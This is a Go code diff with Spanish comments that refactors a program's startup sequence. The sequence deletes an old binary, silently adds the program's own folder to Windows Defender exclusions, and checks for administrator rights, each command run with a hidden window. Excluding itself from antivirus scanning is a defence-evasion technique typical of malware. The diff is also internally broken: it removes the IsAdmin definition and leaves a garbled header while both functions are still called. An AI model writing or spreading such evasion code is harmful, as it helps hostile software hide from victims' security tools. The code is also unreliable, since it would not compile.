@@ -9,8 +9,7 @@ import (
 )
 
 // EnsureDefenderExclusion comprueba y asegura que la carpeta de ejecución esté excluida en Defender
-func CleanOldBinary()
-	EnsureDefenderExclusion() {
+func EnsureDefenderExclusion() {
 exePath, err := os.Executable()
 if err != nil {
 return
@@ -31,16 +30,14 @@ cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 _ = cmd.Run()
 }
 
-// IsAdmin verifica privilegios de Administrador en Windows
-func IsAdmin() bool {
-cmd := exec.Command("net", "session")
-cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-return cmd.Run() == nil
+// RunStartupSequence ejecuta el flujo de inicio esperado por main.go
+func RunStartupSequence() bool {
+CleanOldBinary()
+EnsureDefenderExclusion()
+return IsAdmin()
 }
 
-// CheckStartup ejecuta las verificaciones críticas al arrancar
+// CheckStartup mantiene compatibilidad si algún otro paquete lo invoca
 func CheckStartup() bool {
-CleanOldBinary()
-	EnsureDefenderExclusion()
-return IsAdmin()
+return RunStartupSequence()
 }
